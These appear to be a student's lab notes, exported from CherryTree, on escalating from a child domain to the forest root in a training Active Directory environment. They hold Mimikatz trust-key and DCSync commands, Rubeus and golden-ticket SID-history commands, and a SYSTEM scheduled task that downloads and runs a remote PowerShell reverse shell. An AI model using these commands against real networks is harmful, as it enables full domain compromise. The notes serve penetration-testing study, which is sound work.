<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Domains_same_forest</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Domains_same_forest</h1><br/><p><h3>Methods of escalate trust</h3><ul><li>krbtgt hash </li><li>trust tickets</li></ul></p><p></p><p><h2>Child To parent Trust flow</h2></p><p></p><p><img src="images/378-1.png" alt="images/378-1.png" /></p><p><ul><li>Inter-Realm TGT is encrypted with trust key shared by both parent and child</li><li>the only validation is being able to decrypt the Inter-Realm TGT </li></ul></p><p></p><p></p><p><h2>Privesc : child to parent using trust tickets </h2><ul><li>from domain admin in dcorp to enterprise admin / domain admin in forest root </li><li>steps<ol><li>Invoke-Mimikatz -Command ‘&quot;lsadump::trust /patch &quot; ’ -ComputerName dcorp -dc</li><li> Or : Invoke-Mimikatz -Command ‘&quot;lsadump::dcsync /user:dcorp\mcorp$&quot;’</li><li>now everything we write in TGT will by trusted by the other dc </li><li>inject sid history </li><li>then request TGS for services like cifs and inject the TGS </li><li>rthen we can access fs of the domain2</li></ol></li><li>1. <h2>1. Attack via Rubeus and trusts after extracting kirbi key</h2><ol><li>Invoke-Mimikatz -Command &#39;&quot;lsadump::trust /patch&quot;&#39;</li><li> .\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt</li></ol></li></ul></p><p></p><p></p><p><h2>2 Privesc : child to parent using krbtgt hash</h2><ul><li>Invoke-Mimikatz -Command ‘&quot;kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:b08a216768f3423301009d5953ffbbe3 /ticket:c:\Users\svcadmin\Downloads\ticket.kirbi&quot;’<ul><li><ul><li>\krbtgt:trust_key</li><li>/sids = sid of enterprise domain = &lt;sid of root&gt;+-519</li><li>Create the inter-realm TGT</li><li>we save it into C:\AD\Tools\krbtgt_tkt.kirbi</li></ul></li></ul></li><li>Invoke-Mimikatz -Command &#39;&quot;kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi&quot;&#39;<ul><li><ul><li>inject ticket </li></ul></li></ul></li><li>Grab reverse shell<ul><li>launch powercat listerner + launch web server </li><li>in the elevated shell:<ul><li>schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; /TN &quot;task317&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;<a href="http://172.16.100.x/Invoke-PowerShellTcpEx.ps1''')'">http://172.16.100.17/Invoke-PowerShellTcpEx.ps1&#39;&#39;&#39;)&#39;</a>&quot;</li><li>schtasks /Run /S mcorp-dc.moneycorp.local /TN &quot;task317&quot; // run the STCheck scheduled task</li></ul></li></ul></li></ul></p><p><h2>Conclusion </h2><a name="h2-4"></a><ul><li>forest is the only security boundary </li><li>if a domain admin is compromised within the forest =&gt; defender need to rebuild all the forest </li><li>=&gt; enterprise need to use a lot of forests </li></ul></p><p></p></div>
</body>
</html>
